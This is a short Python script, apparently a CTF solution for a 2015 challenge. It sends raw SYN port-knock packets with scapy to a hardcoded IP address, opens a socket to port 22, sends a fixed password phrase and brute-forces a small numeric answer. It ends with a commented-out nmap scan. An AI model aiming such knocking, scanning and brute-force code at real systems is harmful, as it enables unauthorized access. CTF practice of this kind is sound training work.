#!/usr/bin/python
# sheldon.py
# EINDBAZEN solution to port knocking challenge PHD CTF Quals 2011
# Modified by KoalaTea for RC3 CTF 2015 finding PHIL
 
# Import scapy
from scapy.all import *
import socket


for i in range(20):
	conf.verb = 0
	# Ports
	ports = [22,22,22]
	# Knock once on every port
	for dport in range(0, len(ports)):
	    print "[*] Knocking on 107.170.112.218: " , ports[dport]
	    ip = IP(dst="107.170.112.218")
	    port = 39367
	    SYN = ip/TCP(sport=port, dport=ports[dport], flags="S", window=2048, options=[('MSS',1460)], seq=0)
	    send(SYN) ; print "*KNOCK*"
	    print "PHIL!!!!!!"

	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('107.170.112.218', 22))

	#Connect to the now opened ssh port provide password, seed, and brute force for correct number
	print s.recv(1000)
	s.send("The broker is the coolest")
	print s.recv(1000)
	s.send("1")
	print s.recv(1000)
	temp=1+1
	for j in range(5):
		s.send(str((temp*5)-j))
		data=s.recv(1000)
		print data


# Use NMAP for scanning for open ports
# We also use -sV, so nmap connects to the port and get the flag
'''
print "[*] Scanning for open ports using nmap"
subprocess.call("nmap -sS -sV -T4 -p 22 107.170.112.218", shell=True)
'''
